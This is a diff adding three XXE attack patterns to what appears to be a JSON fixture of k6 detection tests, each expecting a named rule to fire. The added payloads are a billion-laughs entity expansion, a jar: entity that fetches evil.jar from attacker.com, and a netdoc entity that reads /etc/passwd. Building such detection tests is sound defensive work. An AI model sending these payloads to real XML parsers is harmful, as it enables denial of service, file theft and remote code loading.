@@ -1,7 +1,7 @@
 {
   "metadata": {
     "category": "xxe",
-    "total_patterns": 5,
+    "total_patterns": 8,
     "port": 8007,
     "description": "k6 test patterns for XXE attacks"
   },
@@ -60,6 +60,42 @@
       "port": 8007,
       "expected_detection": true,
       "severity": "high"
+    },
+    {
+      "id": "XXE_BILLION_001",
+      "name": "XXE billion laughs DoS attack",
+      "category": "xxe",
+      "subcategory": "entity_expansion",
+      "payload": "<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">",
+      "encoded": "%3C%21ENTITY%20lol%20%22lol%22%3E%3C%21ENTITY%20lol2%20%22%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%22%3E",
+      "port": 8007,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "XXE DOCTYPE Entity Injection Attempt"
+    },
+    {
+      "id": "XXE_JAR_001",
+      "name": "XXE JAR protocol remote code execution",
+      "category": "xxe",
+      "subcategory": "protocol_abuse",
+      "payload": "<!ENTITY xxe SYSTEM \"jar:http://attacker.com/evil.jar!/\">",
+      "encoded": "%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E",
+      "port": 8007,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "XXE External Resource Access Attempt"
+    },
+    {
+      "id": "XXE_NETDOC_001",
+      "name": "XXE netdoc protocol file access",
+      "category": "xxe",
+      "subcategory": "protocol_abuse",
+      "payload": "<!ENTITY xxe SYSTEM \"netdoc:///etc/passwd\">",
+      "encoded": "%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E",
+      "port": 8007,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "XXE External Resource Access Attempt"
     }
   ]
 }
